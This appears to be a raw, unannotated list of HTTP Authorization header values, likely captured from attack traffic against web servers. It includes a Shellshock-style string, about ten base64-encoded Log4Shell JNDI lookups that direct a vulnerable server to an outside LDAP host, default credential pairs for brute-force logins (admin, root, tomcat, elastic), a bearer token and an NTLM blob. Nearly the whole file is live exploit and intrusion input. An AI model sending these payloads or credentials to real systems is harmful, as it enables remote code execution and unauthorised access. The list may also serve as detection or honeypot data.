?(){:;};``',./"<>?|-[]~@$^*%ff\x00\x00\x00\x00\x00\x0a\xff=
Basic JHtqbmRpOmxkYXA6Ly8xNjcuNzEuMTMuMTk2OjIyMjIvbHgtZmZmZmNjMzAxNGI0NTAwMDBkZjY1MWI5NjEwMDAwMDAwMDNiNWViNX06JHtqbmRpOmxkYXA6Ly8xNjcuNzEuMTMuMTk2OjIyMjIvbHgtZmZmZmNjMzAxNGI0NTAwMDBlZjY1MWI5NjEwMDAwMDAwMDg5MWVmMX0=
Basic JHtqbmRpOmxkYXA6Ly8xNjcuNzEuMTMuMTk2OjQ0My9seC1mZmZmY2MzMDE0YjQ0MDFmMGQyMTgyY2U2MTAwMDAwMDAwZDFkNTEyfToke2puZGk6bGRhcDovLzE2Ny43MS4xMy4xOTY6NDQzL2x4LWZmZmZjYzMwMTRiNDQwMWYwZTIxODJjZTYxMDAwMDAwMDA0ODM5Nzh9
Basic JHtqbmRpOmxkYXA6Ly8xNjcuNzEuMTMuMTk2OjQ0My9seC1mZmZmY2MzMDE0YjQ0MDFmMGRiNTAxYmU2MTAwMDAwMDAwNmFmOGRjfToke2puZGk6bGRhcDovLzE2Ny43MS4xMy4xOTY6NDQzL2x4LWZmZmZjYzMwMTRiNDQwMWYwZWI1MDFiZTYxMDAwMDAwMDBmYzg2NTV9
Basic JHtqbmRpOmxkYXA6Ly8xNjcuNzEuMTMuMTk2OjQ0My9seC1mZmZmY2MzMDE0YjQ5MDFmMGQ1ZGI2Yjc2MTAwMDAwMDAwZTAwZTBhfToke2puZGk6bGRhcDovLzE2Ny43MS4xMy4xOTY6NDQzL2x4LWZmZmZjYzMwMTRiNDkwMWYwZTVkYjZiNzYxMDAwMDAwMDAzYzg4MGJ9
Basic JHtqbmRpOmxkYXA6Ly8xNjcuNzEuMTMuMTk2OjQ0My9seC1mZmZmY2MzMDE0YjQ5MDFmMGRiMDhhYjk2MTAwMDAwMDAwNTQwNzNjfToke2puZGk6bGRhcDovLzE2Ny43MS4xMy4xOTY6NDQzL2x4LWZmZmZjYzMwMTRiNDkwMWYwZWIwOGFiOTYxMDAwMDAwMDA2MWQxZWV9
Basic JHtqbmRpOmxkYXA6Ly8xNjcuNzEuMTMuMTk2OjQ0My9seC1mZmZmY2MzMDE0YjQyODIzMGQwODRiYmM2MTAwMDAwMDAwZDYzOGY1fToke2puZGk6bGRhcDovLzE2Ny43MS4xMy4xOTY6NDQzL2x4LWZmZmZjYzMwMTRiNDI4MjMwZTA4NGJiYzYxMDAwMDAwMDBkYzRmMWR9
Basic JHtqbmRpOmxkYXA6Ly8xNjcuNzEuMTMuMTk2OjQ0My9seC1mZmZmY2MzMDE0YjQyODIzMGRlYmI5YzY2MTAwMDAwMDAwNmE0YWNhfToke2puZGk6bGRhcDovLzE2Ny43MS4xMy4xOTY6NDQzL2x4LWZmZmZjYzMwMTRiNDI4MjMwZWViYjljNjYxMDAwMDAwMDBjMWE1N2Z9
Basic JHtqbmRpOmxkYXA6Ly8xNjcuNzEuMTMuMTk2OjQ0My9seC1mZmZmY2MzMDE0YjRiODIyMGQyODNiYmI2MTAwMDAwMDAwMGY4ZDgxfToke2puZGk6bGRhcDovLzE2Ny43MS4xMy4xOTY6NDQzL2x4LWZmZmZjYzMwMTRiNGI4MjIwZTI4M2JiYjYxMDAwMDAwMDBkYjQzODZ9
Basic JHtqbmRpOmxkYXA6Ly8xNjcuNzEuMTMuMTk2OjQ0My9seC1mZmZmY2MzMDE0YjRmYjIwMGRhZjdkYzc2MTAwMDAwMDAwMjE4NjJhfToke2puZGk6bGRhcDovLzE2Ny43MS4xMy4xOTY6NDQzL2x4LWZmZmZjYzMwMTRiNGZiMjAwZWFmN2RjNzYxMDAwMDAwMDBjYmU3Nzh9
Basic OGhZVFNVRms6OGhZVFNVRms=
Basic Og==
Basic YWRtaW46
Basic YWRtaW46MTIzNDU=
Basic YWRtaW46ODg4ODg4
Basic YWRtaW46QVNhc1M=
Basic YWRtaW46YWRtaW4=
Basic YWRtaW46cGFzcw==
Basic YWRtaW46ezEyMjEzQkQxLTY5QzctNDg2Mi04NDNELTI2MDUwMEQxREE0MH0=
Basic YWZpaXNrYzpha2tja3g
Basic ZWxhc3RpYzpwYXNzd29yZA==
Basic cm9vdDphZG1pbg==
Basic cm9vdDpyb290
Basic dG9tY2F0OnMzY3JldA==
Basic dG9tY2F0OnRvbWNhdA==
Basic dXNlcjp1c2Vy
Basic ls=
Bearer
Bearer 63|d86zlHPdHYNwJ6K14mTuf5QzGn4utqeJgtBedHSW
NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
